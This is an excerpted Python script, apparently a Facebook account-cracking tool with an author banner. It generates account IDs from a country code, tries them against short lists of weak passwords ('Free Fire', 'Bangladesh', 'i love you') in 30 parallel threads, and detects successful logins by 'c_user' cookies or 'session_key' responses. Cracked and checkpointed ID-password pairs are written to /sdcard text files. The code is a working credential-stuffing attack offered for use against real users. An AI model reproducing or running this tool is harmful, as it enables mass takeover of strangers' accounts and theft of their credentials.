...
logo=(f"""\x1b[1;97m            
  ...
  ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝                                   
    ...
    │ [✓] AUTHOR   : NAHID-NAZMUL         │
    │ [✓] GITHUB   : Nahid-9893             │
    │ [✓] WHATSAPP : +8801779492166         │
    │ [✓] VERSION  :. 1.2                    │
    │ [✓] POWER BY : \033[1;32mKING \033[1;37m            │
    └───────────────────────────────────────┘""")
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [NAHID-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',}
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [NAHID-OK] %s | %s'%(ids,pas))
                                open(f'/sdcard/NAHID-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [NAHID-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/NAHID-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def ffb1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [NAHID] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [NAHID-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/NAHID-OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
...
def bd():
                ...
                with tred(max_workers=30) as sat:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Free Fire','free fire','Bangladesh','bangladesh','i love you','@#@#@#','123890']
...
def rcrack_free(idf,pwv):
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[NAHID-OK] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[NAHID-CP] '+idf+' | '+ps+'\033[0;97m')
